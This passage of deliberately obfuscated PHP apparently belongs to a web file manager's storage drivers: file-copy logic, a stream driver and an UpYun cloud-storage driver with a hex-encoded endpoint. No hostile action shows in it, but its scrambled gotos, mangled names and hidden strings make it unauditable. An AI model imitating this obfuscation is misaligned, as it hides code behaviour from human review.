REPEAT_RENAME_FOLDER) { $a¶•ó„êğÙ = !1; } goto EĞÓ‚™‚Õæ; D”ïïÁÖù¯: Hook::trigger($bÓÑå„ÍÜ™[556]); if ($AãÚÒéõ–à) { $this->folderSizeResetChildren($AãÚÒéõ–à); } $this->_childrenListClear(); goto f‡Ã¦±ßœ; E¼³›ĞÒä: } private function _copyChildTo($eµ¿×ŒÓ¸¯, $a åíøÍ‡, $BÅİäÆòî§, $e§ÁõÃ¯Èå, &$eå‹Æøõ®ñ, $Bò§ï‘ÆÅ) { goto CÃ½Éô³†…; CÃ½Éô³†…: $CË“®»ÓÎÑ =& $_SERVER[òÀöí]; $FĞˆÏ¶½ÅÙ = $this->sourceInfoCache($BÅİäÆòî§); $cÑŸïÃêšÁ = $eµ¿×ŒÓ¸¯->listPath($a åíøÍ‡); goto DˆƒØÁäàÕ; E‚–°²¶¤Ò: foreach ($Fê„Åí™á as &$dŸ¹Ïß´¢) { goto D‚ŸÔ¸œ„; D‚ŸÔ¸œ„: if (isset($aèâ Ş§ÕÃ[$dŸ¹Ïß´¢[$CË“®»ÓÎÑ[28]]])) { $dŸ¹Ïß´¢ = $aèâ Ş§ÕÃ[$dŸ¹Ïß´¢[$CË“®»ÓÎÑ[28]]]; } $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[388]] = $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[29]] == $CË“®»ÓÎÑ[76]; $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[390]] = _get($dŸ¹Ïß´¢, $CË“®»ÓÎÑ[167], $CË“®»ÓÎÑ[33]); goto E‹ëß¡Ôë”; E‹ëß¡Ôë”: $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[77]] = _get($dŸ¹Ïß´¢, $CË“®»ÓÎÑ[77], 0); $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[436]] = _get($dŸ¹Ïß´¢, $CË“®»ÓÎÑ[436], 0); if (!isset($dŸ¹Ïß´¢[$CË“®»ÓÎÑ[557]]) && $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[436]]) { $eå‹Æøõ®ñ[$CË“®»ÓÎÑ[554]][] = $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[436]]; } goto AÎÅÂƒª™Š; AÎÅÂƒª™Š: if ($e§ÁõÃ¯Èå) { $B¿ Å¹†¸§ = $this->fileNameExistCache($BÅİäÆòî§, $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[28]]); if ($B¿ Å¹†¸§) { if ($dŸ¹Ïß´¢[$CË“®»ÓÎÑ[388]] || $e§ÁõÃ¯Èå == REPEAT_SKIP) { continue; } if ($e§ÁõÃ¯Èå == REPEAT_REPLACE) { $D®í«„¯Ÿñ = $this->sourceInfoCache($B¿ Å¹†¸§); $D¡Ö‰ˆŞ“ = $this->fileHistory($D®í«„¯Ÿñ, $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[436]], $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[77]]); if ($D¡Ö‰ˆŞ“) { $eå‹Æøõ®ñ[$CË“®»ÓÎÑ[518]][] = $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[436]]; } continue; } else { if ($e§ÁõÃ¯Èå == REPEAT_RENAME) { $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[28]] = $this->fileNameAutoCache($BÅİäÆòî§, $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[28]], $e§ÁõÃ¯Èå, !1); } } } } if (!$dŸ¹Ïß´¢[$CË“®»ÓÎÑ[388]] && $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[436]]) { $eå‹Æøõ®ñ[$CË“®»ÓÎÑ[518]][] = $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[436]]; } $E™ô‹›ŒïÔ[] = $this->_makeItemData($dŸ¹Ïß´¢, $FĞˆÏ¶½ÅÙ, $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[28]]); goto aÚ÷‡œ•; aÚ÷‡œ•: } unset($dŸ¹Ïß´¢); if (!empty($E™ô‹›ŒïÔ)) { $this->addAll($E™ô‹›ŒïÔ); $this->_childrenListSelect($BÅİäÆòî§); } goto díÊƒïšÖ…; díÊƒïšÖ…: $Bºç”âÑ¡ = $this->_childrenList($BÅİäÆòî§); $Bºç”âÑ¡ = array_to_keyvalue($Bºç”âÑ¡, $CË“®»ÓÎÑ[28]); foreach ($Fê„Åí™á as $dŸ¹Ïß´¢) { $D®í«„¯Ÿñ = $Bºç”âÑ¡[$dŸ¹Ïß´¢[$CË“®»ÓÎÑ[28]]]; $d™Ú²±ó”» = $D®í«„¯Ÿñ[$CË“®»ÓÎÑ[387]]; $this->_copyApplyMeta($D®í«„¯Ÿñ, $eå‹Æøõ®ñ); if ($dŸ¹Ïß´¢[$CË“®»ÓÎÑ[29]] == $CË“®»ÓÎÑ[76]) { $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[75]] = $eµ¿×ŒÓ¸¯->getPathInner($dŸ¹Ïß´¢[$CË“®»ÓÎÑ[75]]); $this->_copyChildTo($eµ¿×ŒÓ¸¯, $dŸ¹Ïß´¢[$CË“®»ÓÎÑ[75]], $d™Ú²±ó”», $e§ÁõÃ¯Èå, $eå‹Æøõ®ñ, $Bò§ï‘ÆÅ); } } goto d‰ÜË˜ÌÈÕ; DˆƒØÁäàÕ: $Fê„Åí™á = array_merge($cÑŸïÃêšÁ[$CË“®»ÓÎÑ[73]], $cÑŸïÃêšÁ[$CË“®»ÓÎÑ[74]]); $aèâ Ş§ÕÃ = $this->_addFiles($eµ¿×ŒÓ¸¯, $cÑŸïÃêšÁ[$CË“®»ÓÎÑ[73]], $Bò§ï‘ÆÅ); $E™ô‹›ŒïÔ = array(); goto E‚–°²¶¤Ò; d‰ÜË˜ÌÈÕ: } private function _addFiles($b©Å×ß“İğ, $cÂ‚Ü†Ïæè, $a•ˆ¶ÖÖÙÚ) { goto dá«¡° ©„; EàãšÙâ: foreach ($cÂ‚Ü†Ïæè as &$bÇÊÃĞŠ¦) { goto B•‰æƒ¤; fŠ°‡µ‚ê: $bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[169]] = $aƒèàêÜ¡š; Hook::trigger($A¾Ã“ÜÚÉ[559], $bÇÊÃĞŠ¦); $Fô¦º›ë[$aƒèàêÜ¡š][] =& $bÇÊÃĞŠ¦; goto e‚‡¸ì¡õ; e‚‡¸ì¡õ: if (count($Fô¦º›ë[$aƒèàêÜ¡š]) > 1) { $bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[557]] = !0; } goto EÔ´ÂÀ‘‡¡; B•‰æƒ¤: Hook::trigger($A¾Ã“ÜÚÉ[558], $bÇÊÃĞŠ¦); $bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[75]] = $b©Å×ß“İğ->getPathInner($bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[75]]); $D¬È÷¾˜Æà = $b©Å×ß“İğ->hashSimple($bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[75]]); goto B¿âİ¹¯®ë; B¿âİ¹¯®ë: $aƒèàêÜ¡š = $b©Å×ß“İğ->hashMd5($bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[75]]); if (strlen($aƒèàêÜ¡š) > 10 && !isset($Fô¦º›ë[$aƒèàêÜ¡š])) { $Fô¦º›ë[$aƒèàêÜ¡š] = array(); } $bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[170]] = $D¬È÷¾˜Æà; goto fŠ°‡µ‚ê; EÔ´ÂÀ‘‡¡: } unset($bÇÊÃĞŠ¦); $fµ‘™Ô‡–Ó = array($A¾Ã“ÜÚÉ[169] => array($A¾Ã“ÜÚÉ[7], array_keys($Fô¦º›ë))); goto FÄ˜ïé‚Èö; B‰–š“å°: $BªÄÌ÷©›Ê->addAll($bÖ•§¤·Óô); $fµ‘™Ô‡–Ó = array($A¾Ã“ÜÚÉ[169] => array($A¾Ã“ÜÚÉ[7], array_keys($Fô¦º›ë))); $A‰Ÿãè›ô’ = $BªÄÌ÷©›Ê->where($fµ‘™Ô‡–Ó)->select(); goto aÖÏ´ªõ¨î; c÷ƒˆœ‚—: foreach ($A‰Ÿãè›ô’ as $D‘ÙÖÅëÂ‚) { if (!isset($Fô¦º›ë[$D‘ÙÖÅëÂ‚[$A¾Ã“ÜÚÉ[169]]])) { continue; } $eäÕÁ¨˜áà = $Fô¦º›ë[$D‘ÙÖÅëÂ‚[$A¾Ã“ÜÚÉ[169]]]; foreach ($eäÕÁ¨˜áà as &$bÇÊÃĞŠ¦) { $bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[436]] = $D‘ÙÖÅëÂ‚[$A¾Ã“ÜÚÉ[436]]; $bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[557]] = !0; } unset($bÇÊÃĞŠ¦); } $bÖ•§¤·Óô = array(); foreach ($cÂ‚Ü†Ïæè as $BÜ‚ÌˆÏ‘í) { if (isset($BÜ‚ÌˆÏ‘í[$A¾Ã“ÜÚÉ[557]]) && $BÜ‚ÌˆÏ‘í[$A¾Ã“ÜÚÉ[557]]) { continue; } $f…„ôš‡æ… = $b©Å×ß“İğ->getPathInner($BÜ‚ÌˆÏ‘í[$A¾Ã“ÜÚÉ[75]]); $EÆ…Ö¼ÅÚ = $BªÄÌ÷©›Ê->addFileMake($f…„ôš‡æ…, $BÜ‚ÌˆÏ‘í[$A¾Ã“ÜÚÉ[77]], $BÜ‚ÌˆÏ‘í[$A¾Ã“ÜÚÉ[170]], $BÜ‚ÌˆÏ‘í[$A¾Ã“ÜÚÉ[169]], $BÜ‚ÌˆÏ‘í[$A¾Ã“ÜÚÉ[28]], $a•ˆ¶ÖÖÙÚ); $bÖ•§¤·Óô[] = $EÆ…Ö¼ÅÚ; } goto B‰–š“å°; FÄ˜ïé‚Èö: $BªÄÌ÷©›Ê = Model($A¾Ã“ÜÚÉ[560]); $A‰Ÿãè›ô’ = $BªÄÌ÷©›Ê->where($fµ‘™Ô‡–Ó)->select(); $A‰Ÿãè›ô’ = $A‰Ÿãè›ô’ ? $A‰Ÿãè›ô’ : array(); goto c÷ƒˆœ‚—; aÖÏ´ªõ¨î: $A‰Ÿãè›ô’ = $A‰Ÿãè›ô’ ? $A‰Ÿãè›ô’ : array(); foreach ($A‰Ÿãè›ô’ as $D‘ÙÖÅëÂ‚) { if (!isset($Fô¦º›ë[$D‘ÙÖÅëÂ‚[$A¾Ã“ÜÚÉ[169]]])) { continue; } $BÙÏíƒ­¤´ =& $Fô¦º›ë[$D‘ÙÖÅëÂ‚[$A¾Ã“ÜÚÉ[169]]]; foreach ($BÙÏíƒ­¤´ as &$bÇÊÃĞŠ¦) { $bÇÊÃĞŠ¦[$A¾Ã“ÜÚÉ[436]] = $D‘ÙÖÅëÂ‚[$A¾Ã“ÜÚÉ[436]]; } unset($bÇÊÃĞŠ¦); } $añÆÇŠ‰Éš = array(); goto Eó¿ƒĞ®áÕ; Eó¿ƒĞ®áÕ: foreach ($cÂ‚Ü†Ïæè as $fâØËĞ¹êÛ) { $añÆÇŠ‰Éš[$fâØËĞ¹êÛ[$A¾Ã“ÜÚÉ[28]]] = $fâØËĞ¹êÛ; } return $añÆÇŠ‰Éš; goto AÌÆí‚Øøà; dá«¡° ©„: $A¾Ã“ÜÚÉ =& $_SERVER[òÀöí]; if (!$cÂ‚Ü†Ïæè || count($cÂ‚Ü†Ïæè) == 0) { return array(); } $Fô¦º›ë = array(); goto EàãšÙâ; AÌÆí‚Øøà: } } define($_SERVER[òÀöí][561], $_SERVER[òÀöí][562]); goto a«Õè–éÕì; bŞ§·¼¦²—: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($F“ñ·òËÄ³, $E¬ˆé“­Ş = 0) { parent::__construct(); $this->source = $F“ñ·òËÄ³; $this->sourceSize = $E¬ˆé“­Ş; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($A¶‚Óº¸» = false) { return $this->sourceSize; } public function getContent($b¬§ŞÙ¡ŞË = false) { return $this->fileSubstr($b¬§ŞÙ¡ŞË, 0, $this->sourceSize); } public function fileSubstr($eìî×«÷˜” = false, $Aêù·á¥Í = 0, $C‘¯³ÊŒĞÌ = 0) { if (!$C‘¯³ÊŒĞÌ) { $C‘¯³ÊŒĞÌ = $this->sourceSize; } $B±ì˜Ñµ¤ = $this->sourceSize - $Aêù·á¥Í; if ($C‘¯³ÊŒĞÌ >= $B±ì˜Ñµ¤) { $C‘¯³ÊŒĞÌ = $B±ì˜Ñµ¤; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Aêù·á¥Í, $C‘¯³ÊŒĞÌ); } if ($this->sourceType == self::TYPE_FILE) { if ($C‘¯³ÊŒĞÌ <= 0) { return $_SERVER[òÀöí][33]; } $c‡‹íï‚Ø“ = ftell($this->source); fseek_64($this->source, $c‡‹íï‚Ø“ + $Aêù·á¥Í); $dÓ›ĞÍŸ = @fread($this->source, $C‘¯³ÊŒĞÌ); fseek_64($this->source, $c‡‹íï‚Ø“); return $dÓ›ĞÍŸ; } } public function hashMd5($AãÇÙÖ •Æ = false) { return md5($this->getContent()); } public static function hash($D¹¢•ÒÑğæ, $E‹»î˜òÓ = 0) { $cºääÇº¸¿ = new PathDriverStream($D¹¢•ÒÑğæ, $E‹»î˜òÓ); return $cºääÇº¸¿->hashSimple($D¹¢•ÒÑğæ); } public static function md5($A¶‚´ë œ, $aÀÓÖØœÊ™ = 0) { $B‰ä£¶Üò = new PathDriverStream($A¶‚´ë œ, $aÀÓÖØœÊ™); return $B‰ä£¶Üò->hashMd5($A¶‚´ë œ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\x2f\166\60\56\x61\160\x69\x2e\165\160\171\x75\156\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($a›°İ²Å­) { parent::__construct(); $this->_init($a›°İ²Å­); } public function _init($e½ÖÅöµõ«) { $eªñõĞÀ± =& $_SERVER[òÀöí]; foreach ($e½ÖÅöµõ« as $FÛÙÊÑò¶À => $AÆâÈÔÇïº) { if (isset($this->{$FÛÙÊÑò¶À})) { $this->{$FÛÙÊÑò¶À} = $AÆâÈÔÇïº; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($eªñõĞÀ±[1304] . LNG($eªñõĞÀ±[1236])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($DÂÒ¥’Ì, $c±µã­¶—„ = "\x47\x45\124") { $DÑÎ¹¯»®‚ =& $_SERVER[òÀöí]; $A·â˜àÈá± = gmdate($DÑÎ¹¯»®‚[1270]); $C‘ÏÄ×ŒÃ = base64_encode(hash_hmac($DÑÎ¹¯»®‚[1305], "{$c±µã­¶—„}\x26{$DÂÒ¥’Ì}\x26{$A·â˜àÈá±}", md5("{$this->userpass}"), !0)); $cÑÛˆ‹Ã° = array("\x41\x75\x74\150\157\x72\151\172\141\x74\151\x6f\156\x3a\x55\120\x59\125\x4e\40{$this->username}\72{$C‘ÏÄ×ŒÃ}", "\x44\x61\x74\145\x3a{$A·â˜àÈá±}"); return $cÑÛˆ‹Ã°; } public function ussRequest($aŞ¥¦Ø¥´, $aèÜ¥ÕœÌ¹ = "\x47\105\x54", $C„—§‘¢‘ = false, $Aœ—ØÉê¦ = false, $aŸ¤È±Ÿ‚å = false) { goto a‹”Ú›­†; aÙ…ñ¯œµ: if (!$B²Ôêö›Ğ°) { return array($aÜ¥ÊÒÅğ†[1064] => !1, $aÜ¥ÊÒÅğ†[1066] => $aÜ¥ÊÒÅğ†[1306]); } if (strtolower($aèÜ¥ÕœÌ¹) == $aÜ¥ÊÒÅğ†[190] || in_array($B²Ôêö›Ğ°[$aÜ¥ÊÒÅğ†[1064]], array($aÜ¥ÊÒÅğ†[1164], $aÜ¥ÊÒÅğ†[1307]))) { $C„—§‘¢‘ = $B²Ôêö›Ğ°[$aÜ¥ÊÒÅğ†[1308]]; } else { $C„—§‘¢‘ = json_decode($B²Ôêö›Ğ°[$aÜ¥ÊÒÅğ†[1066]], !0); if (!$C„—§‘¢‘) { $C„—§‘¢‘ = $B²Ôêö›Ğ°[$aÜ¥ÊÒÅğ†[1066]]; } else { if (!$B²Ôêö›Ğ°[$aÜ¥ÊÒÅğ†[708]] && isset($C„—§‘¢‘[$aÜ¥ÊÒÅğ†[1309]])) { $C„—§‘¢‘ = $C„—§‘¢‘[$aÜ¥ÊÒÅğ†[1309]]; } } } return array($aÜ¥ÊÒÅğ†[1064] => $B²Ôêö›Ğ°[$aÜ¥ÊÒÅğ†[708]], $aÜ¥ÊÒÅğ†[1066] => $C„—§‘¢‘); goto a¿Å¨¯ÈÇ; d‡ğ©åº¶¥: $DÈ²ñ«è®æ = $this->ussHeaders($f¥¥Öš¸µí, $aèÜ¥ÕœÌ¹); if ($Aœ—ØÉê¦) { $DÈ²ñ«è®æ = array_merge($DÈ²ñ«è®æ, $Aœ—ØÉê¦); } $B²Ôêö›Ğ° = url_request($this->endpoint . $f¥¥Öš¸µí, $aèÜ¥ÕœÌ¹, $C„—§‘¢‘, $DÈ²ñ«è®æ, $aŸ¤È±Ÿ‚å); goto aÙ…ñ¯œµ; a‹”Ú›­†: $aÜ¥ÊÒÅğ† =& $_SERVER[òÀöí]; $aŞ¥¦Ø¥´ = trim($aŞ¥¦Ø¥´, $aÜ¥ÊÒÅğ†[8]); $f¥¥Öš¸µí = "\x2f{$this->bucket}\x2f{$aŞ¥¦Ø¥´}"; goto d‡ğ©åº¶¥; a¿Å¨¯ÈÇ: } public function mkfile($EêÏ³ÕŒ, $dëÙËø¸Õİ = '', $dÆÉÜ¤Õ‚ê = REPEAT_RENAME) { if ($this->setContent($EêÏ³ÕŒ, $dëÙËø¸Õİ)) { return $this->getPathOuter($EêÏ³ÕŒ); } return !1; } public function mkdir($A“äå­’, $C¸ÃªÚøßÈ = REPEAT_SKIP) { $eÒ×ÓöÍÑ¹ =& $_SERVER[òÀöí]; $BÅÌŒ‰‹­÷ = trim($A“äå­’, $eÒ×ÓöÍÑ¹[8]); if ($this->_isFolder($BÅÌŒ‰‹­÷)) { return $this->getPathOuter($BÅÌŒ‰‹­÷); } $Aõ¡˜ìŒ¶ = array($eÒ×ÓöÍÑ¹[1310]); $dÔĞî¡µö = $this->ussRequest($BÅÌŒ‰‹­÷, $eÒ×ÓöÍÑ¹[222], !1, $Aõ¡˜ìŒ¶); return $dÔĞî¡µö[$eÒ×ÓöÍÑ¹[1064]] ? $this->getPathOuter($BÅÌŒ‰‹­÷) : !1; } public function copyFile($bÛ–Ï Ãù¶, $C½Ğ“íôÚ ) { $B“ğ ÙÉÄ‚ =& $_SERVER[òÀöí]; $Eù½ÑÇ¤ = array($B“ğ ÙÉÄ‚[1311] . "\57{$this->bucket}\x2f{$bÛ–Ï Ãù¶}", $B“ğ ÙÉÄ‚[1312]); $DÎùº­ÈÊ = $this->ussRequest($C½Ğ“íôÚ , $B“ğ ÙÉÄ‚[224], !1, $Eù½ÑÇ¤); return $DÎùº­ÈÊ[$B“ğ ÙÉÄ‚[1064]] ? !0 : $this->getPathOuter($C½Ğ“íôÚ ); } public function moveFile($BÄ¢¸×Šµö, $e¬“–“£”ƒ) { $A®­ÂÏ’Ğ =& $_SERVER[òÀöí]; $døªªİ§ = array($A®­ÂÏ’Ğ[1313] . "\57{$this->bucket}\57{$BÄ¢¸×Šµö}", $A®­ÂÏ’Ğ[1312]); $eŸ¤²ÖŠš = $this->ussRequest($e¬“–“£”ƒ, $A®­ÂÏ’Ğ[224], !1, $døªªİ§); return $eŸ¤²ÖŠš[$A®­ÂÏ’Ğ[1064]] ? !0 : $this->getPathOuter($e¬“–“£”ƒ); } public function delFile($FÙËô‰ğÏ») { $Eò÷ëÀœ =& $_SERVER[òÀöí]; $A¬àÓÁéê“ = $this->ussRequest($FÙËô‰ğÏ», $Eò÷ëÀœ[1314]); return $A¬àÓÁéê“[$Eò÷ëÀœ[1064]] ? !0 : !1; } public function delFolder($F¹ÒÄ£²—£) { goto C›‚Ú×‚³; b´²ï‡ó‹ë: $Dõºó½ÎÌ‰ = $B¬À£ŠÒô¥ = array(); $this->fileList($F¹ÒÄ£²—£, $Dõºó½ÎÌ‰, $B¬À£ŠÒô¥, !0); $this->listItemCache = !0; goto aäğ¹Êï‘¥; aäğ¹Êï‘¥: foreach ($B¬À£ŠÒô¥ as $Bç˜¢£ÕŞç) { $cä™ÁªàÙ§ = $this->ussRequest($Bç˜¢£ÕŞç[$a½èÍ‘¡Ÿ¯[28]], $a½èÍ‘¡Ÿ¯[1314]); if (!$cä™ÁªàÙ§[$a½èÍ‘¡Ÿ¯[1064]]) { return !1; } } foreach ($Dõºó½ÎÌ‰ as $eÙ¯÷ÇÅ á) { $cä™ÁªàÙ§ = $this->ussRequest($eÙ¯÷ÇÅ á, $a½èÍ‘¡Ÿ¯[1314]); if (!$cä™ÁªàÙ§[$a½èÍ‘¡Ÿ¯[1064]]) { return !1; } } $cä™ÁªàÙ§ = $this->ussRequest($F¹ÒÄ£²—£, $a½èÍ‘¡Ÿ¯[1314]); goto AŞä‰ô²óÛ; AŞä‰ô²óÛ: return $cä™ÁªàÙ§[$a½èÍ‘¡Ÿ¯[1064]]; goto Föé¨©§; C›‚Ú×‚³: $a½èÍ‘¡Ÿ¯ =& $_SERVER[òÀöí]; if (!$this->exist($F¹ÒÄ£²—£)) { return !0; } $this->listItemCache = !1; goto b´²ï‡ó‹ë; Föé¨©§: } public function rename($fî„…İ–Î, $Cã³š‡Áùë) { if ($this->isFile($fî„…İ–Î)) { $Cã³š‡Áùë = get_path_father($fî„…İ–Î) . $Cã³š‡Áùë; return $this->moveFile($fî„…İ–Î, $Cã³š‡Áùë); } return $this->renameObject($fî„…İ–Î, $Cã³š‡Áùë); } public function fileInfo($d°ÌôâìŒ…, $E²–ˆ ã–ê = false, $aÙÉÙµÏì³ = array()) { goto b³ªÊ¢°; fù·Îõ…é: $d˜ìƒ›°Ì[$fÊŸØ¤†Œ[192]] = intval($aÙÉÙµÏì³[$fÊŸØ¤†Œ[1315]]); $d˜ìƒ›°Ì[$fÊŸØ¤†Œ[83]] = intval($aÙÉÙµÏì³[$fÊŸØ¤†Œ[1316]]); $d˜ìƒ›°Ì[$fÊŸØ¤†Œ[77]] = $aÙÉÙµÏì³[$fÊŸØ¤†Œ[77]]; goto c‚ëÑ·†Ç¬; c‚ëÑ·†Ç¬: return $d˜ìƒ›°Ì; goto cÚ¥ß´ÜÔÄ; dÅªƒ«Ş¬: $d˜ìƒ›°Ì[$fÊŸØ¤†Œ[192]] = $d˜ìƒ›°Ì[$fÊŸØ¤†Œ[83]] = 0; $d˜ìƒ›°Ì[$fÊŸØ¤†Œ[193]] = $d˜ìƒ›°Ì[$fÊŸØ¤†Œ[194]] = !0; if (empty($aÙÉÙµÏì³)) { $aÙÉÙµÏì³ = $this->objectMeta($d°ÌôâìŒ…); if (!$aÙÉÙµÏì³) { return $d˜ìƒ›°Ì; } } goto fù·Îõ…é; b³ªÊ¢°: $fÊŸØ¤†Œ =& $_SERVER[òÀöí]; $d˜ìƒ›°Ì = array($fÊŸØ¤†Œ[28] => $this->pathThis($d°ÌôâìŒ…), $fÊŸØ¤†Œ[75] => $this->getPathOuter($fÊŸØ¤†Œ[8] . $d°ÌôâìŒ…), $fÊŸØ¤†Œ[29] => $fÊŸØ¤†Œ[173], $fÊŸØ¤†Œ[77] => isset($aÙÉÙµÏì³[$fÊŸØ¤†Œ[77]]) ? $aÙÉÙµÏì³[$fÊŸØ¤†Œ[77]] : 0, $fÊŸØ¤†Œ[167] => $this->ext($d°ÌôâìŒ…)); if ($E²–ˆ ã–ê) { return $d˜ìƒ›°Ì; } goto dÅªƒ«Ş¬; cÚ¥ß´ÜÔÄ: } public function folderInfo($aÏ‚—ŸÙÏç, $FÇ›ÚÅÃ‘Ê = false) { goto aÙìÌõ¬ï¼; aÙìÌõ¬ï¼: $dŠ©¾«’Ã =& $_SERVER[òÀöí]; $f–ÌÈÃ‰ìÑ = array($dŠ©¾«’Ã[28] => $this->pathThis($aÏ‚—ŸÙÏç), $dŠ©¾«’Ã[75] => $this->getPathOuter($dŠ©¾«’Ã[8] . $aÏ‚—ŸÙÏç), $dŠ©¾«’Ã[29] => $dŠ©¾«’Ã[76]); if ($FÇ›ÚÅÃ‘Ê) { return $f–ÌÈÃ‰ìÑ; } goto d‡Š¦„‰Ú; d‡Š¦„‰Ú: $f–ÌÈÃ‰ìÑ[$dŠ©¾«’Ã[192]] = $f–ÌÈÃ‰ìÑ[$dŠ©¾«’Ã[83]] = 0; $f–ÌÈÃ‰ìÑ[$dŠ©¾«’Ã[193]] = $f–ÌÈÃ‰ìÑ[$dŠ©¾«’Ã[194]] = !0; if (empty($a£¤ß‘Õª»)) { $a£¤ß‘Õª» = $this->objectMeta($aÏ‚—ŸÙÏç); if (!$a£¤ß‘Õª») { return $f–ÌÈÃ‰ìÑ; } } goto e·®Ïë°¿Ä; e·®Ïë°¿Ä: $f–ÌÈÃ‰ìÑ[$dŠ©¾«’Ã[192]] = intval($a£¤ß‘Õª»[$dŠ©¾«’Ã[1315]]); $f–ÌÈÃ‰ìÑ[$dŠ©¾«’Ã[83]] = intval($a£¤ß‘Õª»[$dŠ©¾«’Ã[1316]]); return $f–ÌÈÃ‰ìÑ; goto A›î•‰øÔ®; A›î•‰øÔ®: } private function listObjs($bé…·’¿äÁ, $F¥ÙÃ˜Í¤ä = 0, $döØÄ’Ï›é = 1000) { $B‘õä˜Ô¢Ó =& $_SERVER[òÀöí]; $b¡ˆä‘®´ = array($B‘õä˜Ô¢Ó[1317], $B‘õä˜Ô¢Ó[1318] . $döØÄ’Ï›é); if ($F¥ÙÃ˜Í¤ä) { $b¡ˆä‘®´[] = $B‘õä˜Ô¢Ó[1319] . $F¥ÙÃ˜Í¤ä; } $fà«÷ä = $this->ussRequest($bé…·’¿äÁ, $B‘õä˜Ô¢Ó[226], !1, $b¡ˆä‘®´); return !$fà«÷ä[$B‘õä˜Ô¢Ó[1064]] ? !1 : $fà«÷ä[$B‘õä˜Ô¢Ó[1066]]; } private function fileList($FêèñÜÚ±Ç, &$còºŸ¦ºêô, &$E×İÅÏ™‚, $aÃ”â’Úœš = false) { goto C±Ñ§ö…´Ø; d¨ƒ¸êÕ‡: if ($B‚ìé˜¨à—) { $this->cacheMethod($Dô…¦Œ‹‘ƒ[197], $FêèñÜÚ±Ç, !0); } goto E½ïÈâÈŒ; C±Ñ§ö…´Ø: $Dô…¦Œ‹‘ƒ =& $_SERVER[òÀöí]; $e„Ÿ³Åà‚¥ = $Dô…¦Œ‹‘ƒ[33]; $d®›Ú¶„‡ö = 1000; goto f¬ÃòÓÎ”; f¬ÃòÓÎ”: $FÏ—ÖÜíÜ¨ = rtrim($FêèñÜÚ±Ç, $Dô…¦Œ‹‘ƒ[8]) . $Dô…¦Œ‹‘ƒ[8]; $B‚ìé˜¨à— = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $D“ÚÅÉÍ·ã = $this->listObjs($FêèñÜÚ±Ç, $e„Ÿ³Åà‚¥, $d®›Ú¶„‡ö); if (!$D“ÚÅÉÍ·ã) { return !1; } $e„Ÿ³Åà‚¥ = isset($D“ÚÅÉÍ·ã[$Dô…¦Œ‹‘ƒ[1320]]) ? $D“ÚÅÉÍ·ã[$Dô…¦Œ‹‘ƒ[1320]] : $Dô…¦Œ‹‘ƒ[33]; $eÊò°ê = isset($D“ÚÅÉÍ·ã[$Dô…¦Œ‹‘ƒ[1321]]) ? $D“ÚÅÉÍ·ã[$Dô…¦Œ‹‘ƒ[1321]] : array(); foreach ($eÊò°ê as $CİğÍµµ) { $bôÄçˆ‹¾¾ = $CİğÍµµ[$Dô…¦Œ‹‘ƒ[29]] == $Dô…¦Œ‹‘ƒ[76] ? !0 : !1; $b³È§èÊ†Ã = ltrim($FÏ—ÖÜíÜ¨ . $CİğÍµµ[$Dô…¦Œ‹‘ƒ[28]], $Dô…¦Œ‹‘ƒ[8]) . ($bôÄçˆ‹¾¾ ? $Dô…¦Œ‹‘ƒ[8] : $Dô…¦Œ‹‘ƒ[33]); $aë­¢ì—ë” = array($Dô…¦Œ‹‘ƒ[28] => $b³È§èÊ†Ã, $Dô…¦Œ‹‘ƒ[29] => $bôÄçˆ‹¾¾ ? $Dô…¦Œ‹‘ƒ[76] : $Dô…¦Œ‹‘ƒ[173], $Dô…¦Œ‹‘ƒ[77] => $CİğÍµµ[$Dô…¦Œ‹‘ƒ[333]], $Dô…¦Œ‹‘ƒ[1316] => $CİğÍµµ[$Dô…¦Œ‹‘ƒ[1322]]); if ($B‚ìé˜¨à—) { $this->cacheMethod($Dô…¦Œ‹‘ƒ[197], $b³È§èÊ†Ã, $bôÄçˆ‹¾¾); $this->cacheMethod($Dô…¦Œ‹‘ƒ[198], $b³È§èÊ†Ã, $aë­¢ì—ë”); } if ($bôÄçˆ‹¾¾) { $còºŸ¦ºêô[] = $b³È§èÊ†Ã; if ($aÃ”â’Úœš) { $this->fileList($b³È§èÊ†Ã, $còºŸ¦ºêô, $E×İÅÏ™‚, $aÃ”â’Úœš); } continue; } $E×İÅÏ™‚[] = $aë­¢ì—ë”; } if (count($eÊò°ê) < $d®›Ú¶„‡ö) { break; } } goto d¨ƒ¸êÕ‡; E½ïÈâÈŒ: } public function listPath($F®¶áÔâ, 